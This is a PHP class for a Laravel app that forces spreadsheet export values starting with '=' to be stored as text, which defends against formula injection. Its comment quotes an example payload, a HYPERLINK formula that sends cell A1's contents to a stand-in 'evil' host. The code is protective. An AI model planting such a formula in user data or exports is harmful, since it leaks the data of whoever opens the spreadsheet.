<?php

namespace App\Support;

use Maatwebsite\Excel\DefaultValueBinder;
use PhpOffice\PhpSpreadsheet\Cell\DataType;

/**
 * Excel exports write the lists' text straight into cells, and PhpSpreadsheet's default binder turns any string that
 * starts with "=" into a live FORMULA. A user named `=HYPERLINK("https://evil/?"&A1, "click")` (or a vehicle plate,
 * a company name, a notes field... — anything a data-entry account can type) would then run inside the spreadsheet of
 * whoever exports the list. Text from the database is data, never a formula: "=..." is stored as plain text.
 * Numbers and dates keep their usual cell types.
 *
 * Registered for every export in AppServiceProvider (`excel.value_binder.default`).
 */
class SafeExcelValueBinder extends DefaultValueBinder
{
    public static function dataTypeForValue($value)
    {
        if (is_string($value) && strlen($value) > 1 && $value[0] === '=') {
            return DataType::TYPE_STRING;
        }

        return parent::dataTypeForValue($value);
    }
}
